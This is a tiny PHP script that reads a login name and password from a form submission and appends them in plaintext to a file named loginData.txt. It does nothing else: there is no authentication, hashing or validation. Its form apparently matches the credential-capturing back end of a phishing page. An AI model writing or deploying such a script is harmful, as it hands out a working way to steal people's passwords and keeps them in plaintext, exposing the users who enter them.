<?php
    $myfile = fopen("loginData.txt", "a+");
    $txt = "Login name : ".$_POST['name']." -> Password : ".$_POST['pass'];
    fwrite($myfile, $txt);
    fclose($myfile);
?>
